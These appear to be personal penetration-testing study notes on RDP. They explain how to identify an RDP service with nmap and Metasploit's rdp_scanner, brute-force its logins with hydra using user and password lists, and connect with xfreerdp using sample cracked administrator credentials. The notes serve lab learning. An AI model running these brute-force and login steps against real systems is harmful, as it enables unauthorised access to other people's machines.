# What is RDP
* Proprietary GUI remote access protocol devloped by Microsoft
* **Used to** remotely connect and interact with a Windows system.
* RDP uses TCP port 3389 by default (can also run on any other tCP port).
* Credentials are required for a user on the target system. (RDP brute force attack can be used to fetch these credentials).

## How to verify if a port is running RDP?
* Connect to the target system and specify one of the ports myself. as the ports running RDP.
* Use a module RDP scanner:
    * `search rdp_scanner`
    * `use auxiliary/scanner/rdp/rdp_scanner`
    * Change the port to the port shown in `nmap -sV [IP]` ---> Eg: if -sV scan showed the port 3333 runnning a service which cannot be verified as RDP, change the port in msfconsole rdp_scanner to 3333.
    * `run` --> If the port 3333 (in this example) is running RDP, it will state that.
 
## Brute-force attack with HYDRA
* `hydra -L [user_list] -P [password_list] rdp://[IP] -s [port number revealed during nmap scan and verified with rdp_scanner]` ---> if -s is not specified hydra will assume to connect to the default RDP port 3389.
* More options to use with hydra can be seen by `hydra`.
* hydra will try to connect to the 'freerdp' RDP client automatically with the credentials fetched during hydra scan. If the connection to 'freeRDP' client is failed to establish, then it connects to 'XfreeRDP`.
* `xfreerdp /u:administrator /p:qwertyuiop /v:[IP]:[port no.]`  --> This should launch GUI giving access to the target system.
